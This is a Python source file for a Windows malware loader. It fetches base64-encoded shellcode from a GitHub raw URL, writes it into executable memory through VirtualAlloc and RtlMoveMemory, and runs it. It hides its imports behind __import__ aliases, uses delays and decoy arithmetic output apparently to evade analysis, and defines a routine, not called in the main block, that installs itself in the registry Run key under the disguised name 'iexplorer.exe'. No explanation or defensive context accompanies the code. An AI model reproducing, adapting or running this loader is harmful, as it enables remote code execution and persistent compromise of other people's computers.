urllib_module = __import__("urllib.request")
request = urllib_module.request

b64 = __import__("base64")
ct = __import__("ctypes")
wreg = __import__("winreg")
s = __import__("sys")
it = __import__("time")
ra = __import__("random")

kernel32 = getattr(ct.windll, "kernel32")
ntdll = getattr(ct.windll, "ntdll")

def random_calculation():
    a = ra.randint(30 * 60, 3 * 60 * 60)
    b = ra.randint(30 * 60, 3 * 60 * 60)
    seed = ra.randint(30 * 60, 3 * 60 * 60)
    operations = ["add", "subtract", "multiply", "divide"]
    index = seed % len(operations)  # Generate an index based on seed
    operation = operations[index]

    if operation == "add":
        result = a + b
    elif operation == "subtract":
        result = a - b
    elif operation == "multiply":
        result = a * b
    elif operation == "divide":
        result = a / b if b != 0 else "Error: Division by zero"

    print(f"Operation: {operation.capitalize()}, Result: {result}")

def bootup():
    exe_path = s.argv[0]
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "iexplorer.exe"

    try:
        with wreg.OpenKey(wreg.HKEY_CURRENT_USER, reg_key, 0, wreg.KEY_SET_VALUE) as key:
            wreg.SetValueEx(key, value_name, 0, wreg.REG_SZ, exe_path)
        print(f"Persistence set: {exe_path} will run at login.")
    except Exception as e:
        print(f"Error setting registry key: {e}")

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = b64.decodebytes(response.read())

    return shellcode

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ct.c_void_p
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)

    kernel32.RtlMoveMemory.argtypes = (
        ct.c_void_p,
        ct.c_void_p,
        ct.c_size_t)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    it.sleep(5)
    buf = ct.create_string_buffer(shellcode)
    ptr = write_memory(buf)
    shell_func = ct.cast(ptr, ct.WINFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    random_calculation()
    try:
        it.sleep(10)
        url = "https://raw.githubusercontent.com/King4erik/Payload-Connection/main/shellcode.bin"
        shellcode = get_code(url)
        it.sleep(15)
        random_calculation()
        run(shellcode)
    except Exception as e:
        print(f"Error: {e}")